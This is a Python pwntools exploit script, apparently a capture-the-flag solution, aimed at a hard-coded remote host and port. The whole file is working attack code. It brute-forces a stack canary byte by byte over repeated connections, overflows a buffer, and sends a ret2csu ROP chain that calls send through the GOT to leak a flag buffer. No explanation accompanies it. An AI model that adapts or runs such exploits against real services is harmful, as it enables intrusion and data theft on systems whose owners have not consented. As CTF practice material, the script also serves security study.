from pwn import *

#context.log_level = 'debug'
ldebug = False
padding = 'A'*0x68
main_addr = 0x400CDD


if ldebug == False:
    host_addr_str = '218.2.197.234'
    host_port = 2090
else:
    host_addr_str = '127.0.0.1'
    host_port = 5555

def ms_leak(al_hs):
    for tmp in range(255):
        io_mess = remote(host_addr_str, host_port)
        io_mess.recvuntil('Welcome!\n')
        io_mess.send(padding + al_hs + chr(tmp))
        try:
            io_mess.recvuntil('Message received!\n')
            print 'now is:', hex(tmp)
            return tmp
        except:
            pass
        io_mess.close()


pop5_ret_addr = 0x400FA6
poparg_call_addr = 0x0400F90
call_vuln_addr = 0x400EA6
read_plt_addr = 0x4009A0
printf_plt_addr = 0x400960
puts_plt_addr = 0x400910
flag_buf_addr = 0x602160
open_read_flg_addr = 0x400B76
welcom_str_addr = 0x401063

puts_got_addr = 0x602020
send_got_addr = 0x602040

def mfrop_gadgets(call_func_addr, arg1=0, arg2=0, arg3=0):
    payload = p64(pop5_ret_addr)
    payload += p64(0)   # add esp, 8
    payload += p64(0)   # pop rbx
    payload += p64(1)   # pop rbp
    payload += p64(call_func_addr)     # pop r12
    payload += p64(arg3) + p64(arg2) + p64(arg1)    # pop r13, r14, r15
    # rdx-r13 ; rsi-r14; rdi-r15
    payload += p64(poparg_call_addr)
    payload += p64(0)   # add esp,8
    payload += p64(0)   # pop rbx
    payload += p64(0)   # pop rbp
    payload += p64(0) + p64(0) + p64(0) # pop r13, r14, r15
    payload += p64(open_read_flg_addr)
    return payload

def ms_ropts(leaked_fs):
    payload = padding + p64(leaked_fs) + p64(0)
    payload += mfrop_gadgets(call_func_addr=send_got_addr, arg1=5, arg2=flag_buf_addr, arg3=50) 
    io_mess = remote(host_addr_str, host_port)
    io_mess.recvuntil('Welcome!\n')
    io_mess.send(payload)
    print io_mess.recv(100)

for tmp in range(255):
    io_mess = remote(host_addr_str, host_port)
    io_mess.recvuntil('Welcome!\n')
    io_mess.send(padding + chr(tmp))
    try:
        io_mess.recvuntil('Message received!\n')
        print 'now is:', hex(tmp)
        break
    except:
        pass
    io_mess.close()

'''
tmp1 = ms_leak(chr(tmp))
tmp2 = ms_leak(chr(tmp)+chr(tmp1))
tmp3 = ms_leak(chr(tmp)+chr(tmp1)+chr(tmp2))
tmp4 = ms_leak(chr(tmp)+chr(tmp1)+chr(tmp2)+chr(tmp3))
tmp5 = ms_leak(chr(tmp)+chr(tmp1)+chr(tmp2)+chr(tmp3)+chr(tmp4))
tmp6 = ms_leak(chr(tmp)+chr(tmp1)+chr(tmp2)+chr(tmp3)+chr(tmp4)+chr(tmp5))
tmp7 = ms_leak(chr(tmp)+chr(tmp1)+chr(tmp2)+chr(tmp3)+chr(tmp4)+chr(tmp5)+chr(tmp6))
leaked_fs = chr(tmp)+chr(tmp1)+chr(tmp2)+chr(tmp3)+chr(tmp4)+chr(tmp5)+chr(tmp6)+chr(tmp7)
leaked_fs = u64(leaked_fs)
print 'leak fs:', hex(leaked_fs)
'''
leaked_fs = int('0x9dccf42e364dcf00', 16)
ms_ropts(leaked_fs)

